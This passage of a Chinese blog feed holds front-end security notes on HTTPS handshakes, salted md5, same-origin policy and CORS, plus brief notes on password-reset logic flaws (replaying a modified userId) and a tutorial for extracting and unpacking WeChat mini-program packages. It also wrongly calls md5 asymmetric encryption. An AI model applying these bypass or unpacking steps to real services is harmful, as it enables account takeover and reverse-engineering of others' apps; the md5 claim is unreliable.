3.HTTP 与 HTTPS"></a>图 3.HTTP 与 HTTPS</h4><p>加入了 SSL 协议之后，HTTP 就有了加密、认证和完整性保护这些功能。SSL 协议是独立的协议，不仅 HTTP 可以使用，其他运行在应用层的 FTP、SMTP 和 Telnet 等协议均可配合 SSL 协议使用。</p><p>SSL 协议采用一种叫做公开密钥加密的加密处理方式。近代的加密方法中加密算法是公开的，而密钥却是保密的。通过这种方式得以保持加密方法的安全性。加密和解密都会用到密钥。没有密钥就无法对密码解密，反过来说，任何人只要持有密钥就能解密了。如果密钥被攻击者获得，那加密也就失去了意义。</p><p>通常密钥的形式有两种，对称密钥和非对称密钥。对称密钥又称为共享密钥，是指加密和解密都公用一把密钥的加密方式。既然是共用密钥，那么就必须由一方生成，共享给另一方，共享就不可避免的要在网络上传输，在网络上传输就无法保证密钥不会被窃取，无法保证密钥不被窃取就相当于无法保证加密的完全安全性。而非对称密钥就很好的解决了这个问题，非对称密钥又称为公开密钥加密，由一把公开密钥和私有密钥组成，公开密钥可以随意公开，任何人都可以获得。使用公开密钥加密的方式，发送密文的发送方使用接收方的公开密钥进行加密，接收方接收到密文后，使用私有密钥进行解锁。这样一来，就可以避免私有密钥的网络传输，不被窃取。单独靠公开密钥和密文解密是非常难，解密过程就是在对离散对数进行求值，这并非轻而易举就能办到。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913667245-6028a187-cb89-4a6d-8782-4cea5b4e764b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913667245-6028a187-cb89-4a6d-8782-4cea5b4e764b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="非对称加密.png"></p><p><a name="5ce9182e"></a></p><h4 id="图-4-非对称加密"><a href="#图-4-非对称加密" class="headerlink" title="图 4.非对称加密"></a>图 4.非对称加密</h4><p>HTTPS 采用混合加密方式，先是通过公开密钥加密的方式交换共享加密的密钥，把密钥安全地共享给对方。之后的通信就通过共享加密进行密文通信，这样做优势在于能充分发挥两种加密方式的优点：公开加密没有传输层面被窃取的可能、共享加密消耗的资源比公开加密要低。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913673981-fcf5197c-2a3f-41d1-8fa3-228904260293.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913673981-fcf5197c-2a3f-41d1-8fa3-228904260293.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="混合加密机制.png"></p><p><a name="fc765a78"></a></p><h4 id="图-5-混合加密机制"><a href="#图-5-混合加密机制" class="headerlink" title="图 5.混合加密机制"></a>图 5.混合加密机制</h4><p><a name="282ad907"></a></p><h3 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h3><p>虽然共享加密方式的安全性得到了保证，但是如何保证公开加密的安全性？怎么保证接收到的公开加密公有密钥是货真价实的密钥，不被掉包呢？为了解决这个问题，人们提出了数字证书这一概念。在使用 HTTPS 协议前，服务器运营人员先向数字证书认证机构（CA,Certificate Authority）和其相关机关申请公开密钥证书，认证机构在接收到申请并判明申请者身份后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起发送给申请者，申请者即运营人员将其布置进服务器中。当有人访问该服务器时，服务器首先把公钥证书以公开加密方式发送至客户端，客户端接收到公钥证书后使用与之绑定的公钥密钥，对证书上的数字签名进行验证，一旦验证通过即说明该证书是准确、安全和值得信赖的。但是怎么把证书安全地转交给运营人员又成了一个问题，因此多数浏览器厂商在开发浏览器时，会首先把常用认证机构的公有密钥预先植入，这样申请者申请证书时安全性便得到保证。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913693699-bb1394dd-baad-41a5-a7be-09edf25bad97.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913693699-bb1394dd-baad-41a5-a7be-09edf25bad97.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="公钥证书认证及其使用.png"></p><p><a name="7ed23d7a"></a></p><h4 id="图-6-公钥证书认证及其使用"><a href="#图-6-公钥证书认证及其使用" class="headerlink" title="图 6.公钥证书认证及其使用"></a>图 6.公钥证书认证及其使用</h4><p>证书除了能判明服务器是否安全，还能用来确认运行服务器背后的公司是否是合法合规、真实存在的。拥有这个特性的证书就是 EV SSL 证书（Extended Validation SSLCertificate）。EV SSL 证书是基于国际标准的认证指导方针颁发的证书。其严格规定了对运营组织是否真实的确认方针，因此，通过认证的 Web 网站能够获得更高的认可度。持有该证书的 WEB 网站一般在地址栏有一些显眼的标志，例如地址栏是绿色的或者有个锁头一样的标志。</p><p>不但服务器能拥有数字证书，客户端同样能，其获取方式与服务器证书如出一辙。但是，客户端证书的获取需要支付一定的费用，所以一般情况下比较少用。</p><p>除了上述具有公信力的认证证书，还有一种自签名证书，这种证书通常有自由认证机构颁发，不过在互联网上无法使用，不具备公信力。如果你想自由生成证书，则 OpenSSL 这套开源程序能够帮助你。</p><p><a name="b54827a2"></a></p><h3 id="HTTPS-的通讯机制"><a href="#HTTPS-的通讯机制" class="headerlink" title="HTTPS 的通讯机制"></a>HTTPS 的通讯机制</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913704418-20dda70b-5049-4b15-a23d-32d627206119.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913704418-20dda70b-5049-4b15-a23d-32d627206119.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="HTTPS的安全通信机制.png"></p><p><a name="20e729e5"></a></p><h4 id="图-7-HTTPS-的安全通信机制"><a href="#图-7-HTTPS-的安全通信机制" class="headerlink" title="图 7.HTTPS 的安全通信机制"></a>图 7.HTTPS 的安全通信机制</h4><p>步骤 1： 客户端通过发送 Client Hello 报文开始 SSL 通信。报文中包含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。</p><p>步骤 2： 服务器可进行 SSL 通信时，会以 Server Hello 报文作为应答。和客户端一样，在报文中包含 SSL 版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。</p><p>步骤 3： 之后服务器发送 Certificate 报文。报文中包含公开密钥证书。</p><p>步骤 4： 最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL 握手协商部分结束。</p><p>步骤 5: SSL 第一次握手结束之后，客户端以 Client Key Exchange 报文作为回应。报文中包含通信加密中使用的一种被称为 Pre-master secret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。</p><p>步骤 6： 接着客户端继续发送 Change Cipher Spec 报文。该报文会提示服务器，在此报文之后的通信会采用 Pre-master secret 密钥加密。</p><p>步骤 7： 客户端发送 Finished 报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。</p><p>步骤 8： 服务器同样发送 Change Cipher Spec 报文。</p><p>步骤 9： 服务器同样发送 Finished 报文。</p><p>步骤 10： 服务器和客户端的 Finished 报文交换完毕之后，SSL 连接就算建立完成。当然，通信会受到 SSL 的保护。从此处开始进行应用层协议的通信，即发送 HTTP 请求。</p><p>步骤 11： 应用层协议通信，即发送 HTTP 响应。步骤 12： 最后由客户端断开连接。断开连接时，发送 close_notify 报文。上图做了一些省略，这步之后再发送 TCP FIN 报文来关闭与 TCP 的通信。</p><p>在以上流程中，应用层发送数据时会附加一种叫做 MAC（Message Authentication Code）的报文摘要。MAC 能够查知报文是否遭到篡改，从而保护报文的完整性。</p><p><a name="59ce014c"></a></p><h3 id="HTTPS-的一些缺点"><a href="#HTTPS-的一些缺点" class="headerlink" title="HTTPS 的一些缺点"></a>HTTPS 的一些缺点</h3><p>HTTPS 固然能大幅提升安全性，但是带来的代价便是资源的消耗，运行算法加密和解密需要一定的 CPU 运算力和内存，访问量越大的网站需要付出的硬件资源越大。一般来说，只会在传输重要信息时才使用 HTTPS 协议，例如用户账号密码、银行卡号密码等等，而其它时候直接使用 HTTP 协议进行通信，这样就能在尽可能保证服务器资源合理的情况下保证信息安全。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5 加密存储</title>
      <link href="/2023/06/29/frontend/security/md5-jia-mi-cun-chu/"/>
      <url>/2023/06/29/frontend/security/md5-jia-mi-cun-chu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="84zeA"></a></p><h3 id="使用-md5-加密存储不安全怎么解决"><a href="#使用-md5-加密存储不安全怎么解决" class="headerlink" title="使用 md5 加密存储不安全怎么解决"></a>使用 md5 加密存储不安全怎么解决</h3><p>md5 是一种常见的非对称加密算法，一般通过加密后的 md5 值获取到原始的字符串并不容易。但是通过彩虹表（将常见密码及其 md5 值对应表预先计算好），可以快速查询到表中的 md5 对应的原文。解决办法是将密码拼接一个字符串（也叫 salt）之后再用 md5 加密。也可以使用其它加密方式。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码重置漏洞</title>
      <link href="/2023/06/29/frontend/security/mi-ma-chong-zhi-lou-dong/"/>
      <url>/2023/06/29/frontend/security/mi-ma-chong-zhi-lou-dong/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>密码重置逻辑<br />一码多用（验证码未绑定手机号）验证码回显前端修改密码未确认用户身份验证码不失效本地验证的绕过修改接收的手机或邮箱跳过验证步骤<br />支付逻辑漏洞<br /><a href="https://www.jianshu.com/p/8ca02b6de053">https://www.jianshu.com/p/8ca02b6de053</a><br><a name="FqVSH"></a></p><h3 id="密码重置漏洞"><a href="#密码重置漏洞" class="headerlink" title="密码重置漏洞"></a>密码重置漏洞</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26802498/1648812548254-c883d7c9-c41a-49d3-94b3-3f238a0b318b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26802498/1648812548254-c883d7c9-c41a-49d3-94b3-3f238a0b318b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>第三种方式:<br />上面原码分析,验证$userId 的参数是否在用户表中,但是没有验证是否在 cooke 中的一致,所以,申请两个账户,然后使用抓包工具,发现 userId 的差别,然后进行修改,重放,发现修改成功<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26802498/1648812549894-bdcd1bc1-b5b6-4fdd-9cfe-0bb0d962ecef.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26802498/1648812549894-bdcd1bc1-b5b6-4fdd-9cfe-0bb0d962ecef.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br><a name="YOKCk"></a></p><h3 id="验证码不失效"><a href="#验证码不失效" class="headerlink" title="验证码不失效"></a>验证码不失效</h3><p>原因缺少<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26802498/1648812550552-ab87831a-2943-496c-ad81-e8ea0bf5df66.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26802498/1648812550552-ab87831a-2943-496c-ad81-e8ea0bf5df66.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />验证码爆破</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同源策略</title>
      <link href="/2023/06/29/frontend/security/tong-yuan-ce-lue/"/>
      <url>/2023/06/29/frontend/security/tong-yuan-ce-lue/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="jV1xx"></a></p><h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p><a name="JE7tZ"></a></p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>不同源的页面之间，不准互相访问数据。这是浏览器故意设置的一个功能限制。<br><a name="PdLFH"></a></p><h2 id="源"><a href="#源" class="headerlink" title="源"></a>源</h2><p>window.origin 或 location.origin 可以得到当前源<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25399795/1644118141453-db6e8915-977d-4841-b4dd-41ba8f6963c8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25399795/1644118141453-db6e8915-977d-4841-b4dd-41ba8f6963c8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br><a name="uvrrW"></a></p><h2 id="浏览器规定"><a href="#浏览器规定" class="headerlink" title="浏览器规定"></a>浏览器规定</h2><p>如果 JS 运行在源 A 中，那么就只能获取源 A 的数据<br />不能获取源 B 的数据，即不允许跨域</p><p><a name="we3dK"></a></p><h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><p>突破浏览器限制的方法<br /><strong>response.setHeader(‘Access-Control-Allow-Origin’, ‘<a href="http://localhost:9990/">http://localhost:9990</a>‘)</strong></p><p><a name="dyur8"></a></p><h1 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h1><p>什么是 JSONP?<br />由于某些浏览器（IE 6,7,8,9）不支持 CORS，所以采用<br />请求一个 JS 文件，JS 会执行一个回调，回调里面包含我们的数据<br />回调名字是随机生成的，用 callback 的参数传给后台，后台会再次返回并执行<br />JSON 的优点<br />可以跨域，兼容 IE<br />JSON 的缺点<br />由于 JSON 用的是 script 标签，所以它传入的数据不精确（拿不到状态码），也只能支持 get 请求，不支持 post</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序抓包与反编译</title>
      <link href="/2023/06/29/frontend/security/wei-xin-xiao-cheng-xu-zhua-bao-yu-fan-bian-yi/"/>
      <url>/2023/06/29/frontend/security/wei-xin-xiao-cheng-xu-zhua-bao-yu-fan-bian-yi/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="NKnKx"></a></p><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>首先我们这里的要准备一个安卓模拟器，这里我用的雷电模拟器，这个也可以用其他的模拟器可以自行选择。</p><p>在模拟器上下载微信并登录之后找到对应的⼩程序点击打开即可（因为兼容性问题，在 安卓模拟器中微信⼩程序可能会闪退，但这并不影响后续操作，⼩程序数据包已经成⾃带下载了）。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707149784-dba28ff3-011c-4b2d-bf9b-e4841a392187.png#height=953&id=INAhw&originHeight=1028&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=556" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707149784-dba28ff3-011c-4b2d-bf9b-e4841a392187.png#height=953&id=INAhw&originHeight=1028&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=556" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707179436-5132da03-a99f-473f-b386-21e9766e7393.png#height=958&id=OYw2v&originHeight=1028&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=559" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707179436-5132da03-a99f-473f-b386-21e9766e7393.png#height=958&id=OYw2v&originHeight=1028&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=559" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707230779-2824a3a0-3205-4811-b5d6-18b0023df4f0.png#height=949&id=u1YTt&originHeight=1028&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=554" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707230779-2824a3a0-3205-4811-b5d6-18b0023df4f0.png#height=949&id=u1YTt&originHeight=1028&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=554" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707282038-e2ed1a03-8a56-469c-b834-f5c2bcd5195f.png#height=272&id=GAGyS&originHeight=272&originWidth=506&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=506" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707282038-e2ed1a03-8a56-469c-b834-f5c2bcd5195f.png#height=272&id=GAGyS&originHeight=272&originWidth=506&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=506" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>接 着我们便能在安卓保存路径：&#x2F;data&#x2F;data&#x2F;com.tencent.mm&#x2F;MicroMsg&#x2F;{⽤户 ID}&#x2F;appbrand&#x2F;pkg&#x2F; 下；iOS 保存路径：&#x2F;var&#x2F;mobile&#x2F;Containers&#x2F;Data&#x2F;Application&#x2F;{程序 UUID}&#x2F;Library&#x2F;WechatPrivate&#x2F;{⽤户 ID}&#x2F;WeApp&#x2F;LocalCache&#x2F;release&#x2F;{⼩程序 ID}&#x2F; ）下找到⼩程 序包。</p><p>接着找到上面的路径，然后全部选择。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707339351-dde4c306-4315-4ea8-b26a-dec9062e9b6c.png#height=298&id=eVzlO&originHeight=800&originWidth=1644&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=612" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707339351-dde4c306-4315-4ea8-b26a-dec9062e9b6c.png#height=298&id=eVzlO&originHeight=800&originWidth=1644&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=612" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707358171-ae4c2691-6d7a-430a-a78d-39e43f889c09.png#height=135&id=sx6Ma&originHeight=334&originWidth=1508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=609" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707358171-ae4c2691-6d7a-430a-a78d-39e43f889c09.png#height=135&id=sx6Ma&originHeight=334&originWidth=1508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=609" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>选择以后点击打开安卓文件夹</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707392917-7211240e-614c-49b0-b7cf-bb70c9b11421.png#height=301&id=u00jc&originHeight=605&originWidth=1191&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=593" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707392917-7211240e-614c-49b0-b7cf-bb70c9b11421.png#height=301&id=u00jc&originHeight=605&originWidth=1191&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=593" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707406928-af011a4b-b0e8-4885-b6f8-23a8316443b5.png#height=249&id=AaGHI&originHeight=495&originWidth=1196&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=601" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707406928-af011a4b-b0e8-4885-b6f8-23a8316443b5.png#height=249&id=AaGHI&originHeight=495&originWidth=1196&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=601" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707423631-a3c68687-4b85-492c-990e-77a0524f1027.png#height=237&id=kGmqc&originHeight=314&originWidth=803&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=605" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707423631-a3c68687-4b85-492c-990e-77a0524f1027.png#height=237&id=kGmqc&originHeight=314&originWidth=803&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=605" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />然后就能看到它被提取出来了</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707469990-53c25fe7-4a33-4bbe-94df-71b5b06cd20a.png#height=128&id=qqsFV&originHeight=147&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=598" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707469990-53c25fe7-4a33-4bbe-94df-71b5b06cd20a.png#height=128&id=qqsFV&originHeight=147&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=598" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这⾥我们使⽤ wxappUnpacker 解包⼯具（下载地址：<a href="https://data.hackinn.com/tools/wxappUnpacker.zip()%E8%AE%B0%E4%BD%8F%E8%BF%99%E9%87%8C%E5%A4%8D%E5%88%B6%E5%88%B0%E8%BF%85%E9%9B%B7%E9%87%8C%E9%9D%A2%E6%89%93%E5%BC%80%E4%B8%8B%E8%BD%BD">https://data.hackinn.com/tools/wxappUnpacker.zip(</a>，此下载包为⼆次优化版本），直接使⽤“node wuWxapkg.js ⼩程序包名”命令即可⼀键解包（需 提前安装 node.js 及其他组件，详⻅包内使⽤说明），⾮常⽅便：[nodejs 安装]</p><p>然后解包</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707611974-8ff738b8-bbf1-40be-9066-caaf6a24a4e7.png#height=280&id=VhPg8&originHeight=551&originWidth=1207&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=613" class="lazyload placeholder" 